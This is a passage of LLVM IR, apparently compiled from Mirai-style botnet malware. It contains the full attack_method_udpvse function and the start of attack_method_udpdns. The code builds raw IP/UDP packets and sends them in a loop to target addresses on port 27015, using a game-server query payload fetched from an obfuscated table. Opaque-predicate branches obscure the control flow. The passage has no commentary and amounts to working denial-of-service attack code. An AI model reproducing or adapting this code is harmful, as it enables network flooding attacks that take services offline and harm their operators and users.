; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %400

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %400

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %originalBBpart2, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %179

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #6
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = and i8 %93, 15
  %95 = or i8 %94, 64
  store i8 %95, i8* %92, align 4
  %96 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %97 = bitcast %struct.iphdr* %96 to i8*
  %98 = load i8, i8* %97, align 4
  %99 = and i8 %98, -16
  %100 = or i8 %99, 5
  store i8 %100, i8* %97, align 4
  %101 = load i8, i8* %12, align 1
  %102 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i32 0, i32 1
  store i8 %101, i8* %103, align 1
  %104 = load i32, i32* %19, align 4
  %105 = sext i32 %104 to i64
  %106 = add i64 32, %105
  %107 = trunc i64 %106 to i16
  %108 = call zeroext i16 @htons(i16 zeroext %107) #7
  %109 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %110 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %109, i32 0, i32 2
  store i16 %108, i16* %110, align 2
  %111 = load i16, i16* %13, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %111) #7
  %113 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 3
  store i16 %112, i16* %114, align 4
  %115 = load i8, i8* %14, align 1
  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 5
  store i8 %115, i8* %117, align 4
  %118 = load i8, i8* %15, align 1
  %119 = icmp ne i8 %118, 0
  br i1 %119, label %120, label %124

; <label>:120:                                    ; preds = %73
  %121 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %122 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 4
  store i16 %121, i16* %123, align 2
  br label %124

; <label>:124:                                    ; preds = %120, %73
  %125 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 6
  store i8 17, i8* %126, align 1
  %127 = load i32, i32* @LOCAL_ADDR, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 8
  store i32 %127, i32* %129, align 4
  %130 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %131 = load i32, i32* %9, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i64 %132
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i32 0, i32 1
  %135 = load i32, i32* %134, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 9
  store i32 %135, i32* %137, align 4
  %138 = load i16, i16* %16, align 2
  %139 = call zeroext i16 @htons(i16 zeroext %138) #7
  %140 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %141 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %140, i32 0, i32 0
  store i16 %139, i16* %141, align 2
  %142 = load i16, i16* %17, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 1
  store i16 %143, i16* %145, align 2
  %146 = load i32, i32* %19, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 12, %147
  %149 = trunc i64 %148 to i16
  %150 = call zeroext i16 @htons(i16 zeroext %149) #7
  %151 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %152 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i8*, i8** %22, align 8
  %154 = bitcast i8* %153 to i32*
  store i32 -1, i32* %154, align 4
  %155 = load i8*, i8** %22, align 8
  %156 = getelementptr inbounds i8, i8* %155, i64 4
  store i8* %156, i8** %22, align 8
  %157 = load i8*, i8** %22, align 8
  %158 = load i8*, i8** %18, align 8
  %159 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %157, i8* %158, i32 %159)
  br label %160

; <label>:160:                                    ; preds = %124
  %161 = load i32, i32* @x.35
  %162 = load i32, i32* @y.36
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %160
  %169 = load i32, i32* %9, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %9, align 4
  %171 = load i32, i32* @x.35
  %172 = load i32, i32* @y.36
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %68

; <label>:179:                                    ; preds = %68
  %180 = load i32, i32* @x.35
  %181 = load i32, i32* @y.36
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %179
  %188 = load i32, i32* @x.35
  %189 = load i32, i32* @y.36
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %196

; <label>:196:                                    ; preds = %399, %originalBBpart29
  store i32 0, i32* %9, align 4
  br label %197

; <label>:197:                                    ; preds = %396, %196
  %198 = load i32, i32* @x.35
  %199 = load i32, i32* @y.36
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %197
  %206 = load i32, i32* %9, align 4
  %207 = load i8, i8* %5, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp slt i32 %206, %208
  %210 = load i32, i32* @x.35
  %211 = load i32, i32* @y.36
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br i1 %209, label %218, label %399

; <label>:218:                                    ; preds = %originalBBpart213
  %219 = load i32, i32* @x.35
  %220 = load i32, i32* @y.36
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %218
  %227 = load i8**, i8*** %11, align 8
  %228 = load i32, i32* %9, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds i8*, i8** %227, i64 %229
  %231 = load i8*, i8** %230, align 8
  store i8* %231, i8** %23, align 8
  %232 = load i8*, i8** %23, align 8
  %233 = bitcast i8* %232 to %struct.iphdr*
  store %struct.iphdr* %233, %struct.iphdr** %24, align 8
  %234 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i64 1
  %236 = bitcast %struct.iphdr* %235 to %struct.udphdr*
  store %struct.udphdr* %236, %struct.udphdr** %25, align 8
  %237 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %238 = load i32, i32* %9, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %237, i64 %239
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i32 0, i32 2
  %242 = load i8, i8* %241, align 4
  %243 = zext i8 %242 to i32
  %244 = icmp slt i32 %243, 32
  %245 = load i32, i32* @x.35
  %246 = load i32, i32* @y.36
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %244, label %253, label %290

; <label>:253:                                    ; preds = %originalBBpart217
  %254 = load i32, i32* @x.35
  %255 = load i32, i32* @y.36
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %253
  %262 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %263 = load i32, i32* %9, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %262, i64 %264
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i32 0, i32 1
  %267 = load i32, i32* %266, align 4
  %268 = call i32 @ntohl(i32 %267) #7
  %269 = call i32 @rand_next()
  %270 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %270, i64 %272
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %273, i32 0, i32 2
  %275 = load i8, i8* %274, align 4
  %276 = zext i8 %275 to i32
  %277 = lshr i32 %269, %276
  %278 = add i32 %268, %277
  %279 = call i32 @htonl(i32 %278) #7
  %280 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %281 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %280, i32 0, i32 9
  store i32 %279, i32* %281, align 4
  %282 = load i32, i32* @x.35
  %283 = load i32, i32* @y.36
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart235, label %originalBB19alteredBB

originalBBpart235:                                ; preds = %originalBB19
  br label %290

; <label>:290:                                    ; preds = %originalBBpart235, %originalBBpart217
  %291 = load i16, i16* %13, align 2
  %292 = zext i16 %291 to i32
  %293 = icmp eq i32 %292, 65535
  br i1 %293, label %294, label %315

; <label>:294:                                    ; preds = %290
  %295 = load i32, i32* @x.35
  %296 = load i32, i32* @y.36
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %294
  %303 = call i32 @rand_next()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 3
  store i16 %304, i16* %306, align 4
  %307 = load i32, i32* @x.35
  %308 = load i32, i32* @y.36
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %315

; <label>:315:                                    ; preds = %originalBBpart239, %290
  %316 = load i16, i16* %16, align 2
  %317 = zext i16 %316 to i32
  %318 = icmp eq i32 %317, 65535
  br i1 %318, label %319, label %324

; <label>:319:                                    ; preds = %315
  %320 = call i32 @rand_next()
  %321 = trunc i32 %320 to i16
  %322 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 0
  store i16 %321, i16* %323, align 2
  br label %324

; <label>:324:                                    ; preds = %319, %315
  %325 = load i16, i16* %17, align 2
  %326 = zext i16 %325 to i32
  %327 = icmp eq i32 %326, 65535
  br i1 %327, label %328, label %349

; <label>:328:                                    ; preds = %324
  %329 = load i32, i32* @x.35
  %330 = load i32, i32* @y.36
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %328
  %337 = call i32 @rand_next()
  %338 = trunc i32 %337 to i16
  %339 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %340 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %339, i32 0, i32 1
  store i16 %338, i16* %340, align 2
  %341 = load i32, i32* @x.35
  %342 = load i32, i32* @y.36
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %349

; <label>:349:                                    ; preds = %originalBBpart243, %324
  %350 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 7
  store i16 0, i16* %351, align 2
  %352 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %353 = bitcast %struct.iphdr* %352 to i16*
  %354 = call zeroext i16 @checksum_generic(i16* %353, i32 20)
  %355 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 7
  store i16 %354, i16* %356, align 2
  %357 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %358 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %357, i32 0, i32 3
  store i16 0, i16* %358, align 2
  %359 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %360 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %361 = bitcast %struct.udphdr* %360 to i8*
  %362 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %363 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %362, i32 0, i32 2
  %364 = load i16, i16* %363, align 2
  %365 = load i32, i32* %19, align 4
  %366 = sext i32 %365 to i64
  %367 = add i64 12, %366
  %368 = trunc i64 %367 to i32
  %369 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %359, i8* %361, i16 zeroext %364, i32 %368)
  %370 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 3
  store i16 %369, i16* %371, align 2
  %372 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %373 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %372, i32 0, i32 1
  %374 = load i16, i16* %373, align 2
  %375 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i32 0, i32 0
  %380 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %379, i32 0, i32 1
  store i16 %374, i16* %380, align 2
  %381 = load i32, i32* %10, align 4
  %382 = load i8*, i8** %23, align 8
  %383 = load i32, i32* %19, align 4
  %384 = sext i32 %383 to i64
  %385 = add i64 32, %384
  %386 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %387 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %388 = load i32, i32* %9, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i64 %389
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i32 0, i32 0
  %392 = bitcast %struct.sockaddr_in* %391 to %struct.sockaddr*
  store %struct.sockaddr* %392, %struct.sockaddr** %386, align 8
  %393 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %394 = load %struct.sockaddr*, %struct.sockaddr** %393, align 8
  %395 = call i64 @sendto(i32 %381, i8* %382, i64 %385, i32 16384, %struct.sockaddr* %394, i32 16)
  br label %396

; <label>:396:                                    ; preds = %349
  %397 = load i32, i32* %9, align 4
  %398 = add nsw i32 %397, 1
  store i32 %398, i32* %9, align 4
  br label %197

; <label>:399:                                    ; preds = %originalBBpart213
  br label %196

; <label>:400:                                    ; preds = %64, %58
  %401 = load i32, i32* @x.35
  %402 = load i32, i32* @y.36
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %400
  %409 = load i32, i32* @x.35
  %410 = load i32, i32* @y.36
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %160
  %417 = load i32, i32* %9, align 4
  %_ = shl i32 %417, 1
  %_1 = sub i32 %417, 1
  %gen = mul i32 %_1, 1
  %_2 = shl i32 %417, 1
  %_3 = sub i32 %417, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 %417, 1
  %gen6 = mul i32 %_5, 1
  %418 = add nsw i32 %417, 1
  store i32 %418, i32* %9, align 4
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %179
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %197
  %419 = load i32, i32* %9, align 4
  %420 = load i8, i8* %5, align 1
  %421 = zext i8 %420 to i32
  %422 = icmp slt i32 %419, %421
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %218
  %423 = load i8**, i8*** %11, align 8
  %424 = load i32, i32* %9, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds i8*, i8** %423, i64 %425
  %427 = load i8*, i8** %426, align 8
  store i8* %427, i8** %23, align 8
  %428 = load i8*, i8** %23, align 8
  %429 = bitcast i8* %428 to %struct.iphdr*
  store %struct.iphdr* %429, %struct.iphdr** %24, align 8
  %430 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i64 1
  %432 = bitcast %struct.iphdr* %431 to %struct.udphdr*
  store %struct.udphdr* %432, %struct.udphdr** %25, align 8
  %433 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %434 = load i32, i32* %9, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %433, i64 %435
  %437 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %436, i32 0, i32 2
  %438 = load i8, i8* %437, align 4
  %439 = zext i8 %438 to i32
  %440 = icmp slt i32 %439, 32
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %253
  %441 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %444, i32 0, i32 1
  %446 = load i32, i32* %445, align 4
  %447 = call i32 @ntohl(i32 %446) #7
  %448 = call i32 @rand_next()
  %449 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %450 = load i32, i32* %9, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %449, i64 %451
  %453 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %452, i32 0, i32 2
  %454 = load i8, i8* %453, align 4
  %455 = zext i8 %454 to i32
  %_20 = sub i32 0, %448
  %gen21 = add i32 %_20, %455
  %_22 = shl i32 %448, %455
  %_23 = sub i32 0, %448
  %gen24 = add i32 %_23, %455
  %_25 = sub i32 0, %448
  %gen26 = add i32 %_25, %455
  %_27 = sub i32 0, %448
  %gen28 = add i32 %_27, %455
  %_29 = sub i32 %448, %455
  %gen30 = mul i32 %_29, %455
  %456 = lshr i32 %448, %455
  %_31 = shl i32 %447, %456
  %_32 = sub i32 %447, %456
  %gen33 = mul i32 %_32, %456
  %457 = add i32 %447, %456
  %458 = call i32 @htonl(i32 %457) #7
  %459 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %460 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %459, i32 0, i32 9
  store i32 %458, i32* %460, align 4
  br label %originalBB19

originalBB37alteredBB:                            ; preds = %originalBB37, %294
  %461 = call i32 @rand_next()
  %462 = trunc i32 %461 to i16
  %463 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 3
  store i16 %462, i16* %464, align 4
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %328
  %465 = call i32 @rand_next()
  %466 = trunc i32 %465 to i16
  %467 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %468 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %467, i32 0, i32 1
  store i16 %466, i16* %468, align 2
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %400
  br label %originalBB45
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
